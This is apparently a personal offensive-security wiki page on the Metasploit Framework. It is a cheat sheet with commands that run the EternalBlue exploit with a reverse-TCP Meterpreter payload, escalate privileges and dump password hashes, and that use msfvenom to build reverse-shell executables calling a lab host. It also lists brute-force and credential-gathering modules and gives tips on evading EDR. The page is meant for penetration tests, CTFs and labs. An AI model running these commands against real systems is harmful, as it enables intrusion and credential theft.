---
title: Metasploit Framework
permalink: /wiki/offsec-notes/entities/metasploit/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
---

# Metasploit Framework

**Type:** Framework / Tool
**Also known as:** MSF, msfconsole
**Related:** [Buffer Overflow](/wiki/offsec-notes/concepts/buffer-overflow/), [Web Application Testing](/wiki/offsec-notes/concepts/web-application-testing/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/), [Network Scanning](/wiki/offsec-notes/concepts/network-scanning/)

## Description
Metasploit is the world's most widely used penetration testing framework. It provides a modular platform for developing, testing, and executing exploits, alongside auxiliary modules for scanning, enumeration, and post-exploitation. Maintained by Rapid7; open-source community edition (Metasploit Framework) and commercial editions (Metasploit Pro).

## Usage / Details

### Core Concepts
- **Module types:** exploit, auxiliary, post, payload, encoder, nop, evasion
- **Handlers:** `multi/handler` — catches reverse shells
- **Sessions:** Meterpreter or shell sessions after exploitation
- **Workspaces:** Organize targets and findings per engagement

### Common Workflow
```bash
msfconsole

# Search for a module
search type:exploit name:eternalblue
search cve:2021-44228

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.1
set LHOST 10.10.10.99
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Meterpreter post-exploitation
meterpreter> sysinfo
meterpreter> getsystem
meterpreter> hashdump
meterpreter> upload /path/local /path/remote
meterpreter> shell

# Generate payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.99 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.99 LPORT=4444 -f elf -o shell.elf
```

### Useful Auxiliary Modules
```
auxiliary/scanner/smb/smb_ms17_010      # EternalBlue check
auxiliary/scanner/http/dir_scanner       # Directory enumeration
auxiliary/scanner/vnc/vnc_login          # VNC brute-force
auxiliary/scanner/ssh/ssh_login          # SSH brute-force
auxiliary/gather/ldap_query              # LDAP enumeration
```

### Post-Exploitation Modules
```
post/multi/recon/local_exploit_suggester  # Suggest local privesc
post/windows/gather/credentials/         # Credential gathering modules
post/windows/manage/enable_rdp           # Enable RDP
post/multi/manage/shell_to_meterpreter   # Upgrade shell
```

## Limitations
- Meterpreter is heavily signatured; detected by most EDRs and AVs.
- Use for CTFs, labs, and penetration tests in non-EDR environments.
- For red teams against modern EDR, prefer custom implants or Cobalt Strike/Sliver.
- `use evasion/` modules exist but have limited effectiveness against modern AV.

## References
- Metasploit Framework documentation — docs.metasploit.com
- Metasploit Unleashed — offensive-security.com/metasploit-unleashed
